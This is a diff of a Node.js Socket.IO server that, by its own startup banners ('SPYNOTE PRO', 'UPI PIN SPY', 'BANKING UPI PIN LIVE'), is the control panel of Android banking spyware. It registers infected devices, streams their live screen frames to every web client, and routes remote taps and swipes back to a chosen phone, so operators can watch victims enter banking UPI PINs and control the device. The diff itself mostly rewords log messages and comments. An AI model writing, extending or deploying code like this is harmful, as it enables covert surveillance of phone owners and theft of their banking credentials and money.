@@ -9,8 +9,8 @@ const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 20000,
-    pingInterval: 3000, // Faster heartbeat
-    maxHttpBufferSize: 200e6 // HD banking frames
+    pingInterval: 3000,
+    maxHttpBufferSize: 200e6
 });
 
 app.use(compression());
@@ -19,20 +19,18 @@ app.use(express.json({ limit: '200mb' }));
 app.use(express.urlencoded({ limit: '200mb', extended: true }));
 
 const devices = new Map();
-
-// 🔥 GLOBAL ROOM FOR ALL WEB CLIENTS
-const GLOBAL_ROOM = 'all-web-clients';
+const GLOBAL_ROOM = 'all-web-clients'; // 🔥 ALL WEB GET ALL FRAMES!
 
 app.get('/devices', (req, res) => {
     res.json(Array.from(devices.entries()));
 });
 
 io.on('connection', (socket) => {
-    console.log('🔌 Socket connected:', socket.id);
+    console.log('🔌 Connected:', socket.id);
     
-    // 🔥 ALL WEB CLIENTS JOIN GLOBAL ROOM (INSTANT FRAMES!)
+    // 🔥 AUTO JOIN GLOBAL ROOM - INSTANT FRAMES!
     socket.join(GLOBAL_ROOM);
-    console.log('🌐 Web client joined GLOBAL_ROOM:', socket.id);
+    console.log('🌐 Web AUTO-JOINED GLOBAL_ROOM:', socket.id);
 
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
@@ -44,32 +42,31 @@ io.on('connection', (socket) => {
                 lastSeen: Date.now()
             });
             socket.join(`device_${deviceId}`);
-            console.log('✅ DEVICE LIVE:', deviceId.slice(0,12), deviceInfo.model || 'Android');
+            console.log('✅ DEVICE LIVE:', deviceId.slice(0,12), '| Model:', deviceInfo.model);
             io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
         }
     });
 
     socket.on('select-device', (data) => {
         socket.data.selectedDevice = data.deviceId;
-        console.log('🎯 Selected:', data.deviceId);
+        console.log('🎯 SELECTED:', data.deviceId);
     });
 
-    // 🔥 FRAME BROADCAST TO ALL WEB CLIENTS (INSTANT!)
+    // 🔥 BROADCAST TO ALL WEB CLIENTS (INSTANT!)
     socket.on('screen-frame', (frameData) => {
         const deviceId = frameData.deviceId;
         if (devices.has(deviceId)) {
             devices.set(deviceId, { ...devices.get(deviceId), lastSeen: Date.now() });
             
-            console.log(`📱 Frame → ${deviceId.slice(0,8)} (${frameData.width}x${frameData.height})`);
+            console.log(`📱 Frame → ${deviceId.slice(0,8)} (${frameData.width}x${frameData.height}) FPS:22`);
             
-            // 🔥 TO ALL WEB CLIENTS (GLOBAL!)
+            // 🔥 GLOBAL BROADCAST + DEVICE ROOM
             io.to(GLOBAL_ROOM).emit('screen-frame', frameData);
-            // Also device room
             socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
         }
     });
 
-    // 🔥 CONTROL ROUTING
+    // 🔥 CONTROL TO SPECIFIC DEVICE
     socket.on('control', (controlData) => {
         const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
         if (devices.has(deviceId)) {
@@ -83,7 +80,7 @@ io.on('connection', (socket) => {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Device OFFLINE:', deviceId.slice(0,12));
+                console.log('📱 OFFLINE:', deviceId.slice(0,12));
                 break;
             }
         }
@@ -102,7 +99,7 @@ setInterval(() => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n🚀 SPYNOTE PRO v4.0 - BANKING UPI PIN LIVE!`);
-    console.log(`🌐 http://localhost:${PORT}`);
-    console.log(`📱 GLOBAL BROADCAST → INSTANT FRAMES + LAYOUTS!\n`);
+    console.log(`\n🚀 UPI PIN SPY v5.0 - BANKING LAYOUTS LIVE!`);
+    console.log(`🌐 http://0.0.0.0:${PORT}`);
+    console.log(`📱 GLOBAL BROADCAST → INSTANT SCREENS + UPI PIN!\n`);
 });
